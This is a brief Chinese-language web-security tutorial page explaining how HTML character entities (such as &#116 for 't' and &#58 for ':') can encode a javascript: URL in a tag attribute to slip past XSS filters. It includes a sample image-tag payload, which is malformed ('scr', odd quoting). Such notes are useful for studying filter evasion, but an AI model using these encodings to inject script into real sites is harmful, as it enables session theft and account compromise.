---
layout: default
---
# ![](../img/hj.jpg)XSS对标签属性值转码

html属性值都支持ascii码
```
<img scr=''javascrip&#116&#58alert('xss');''>

t的ascii码是116   用&#116表示
:是&#58
tab的&#9，
换行&#10，
&#13可插任意地方

用hackbar的xss中html charactors转
```
__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
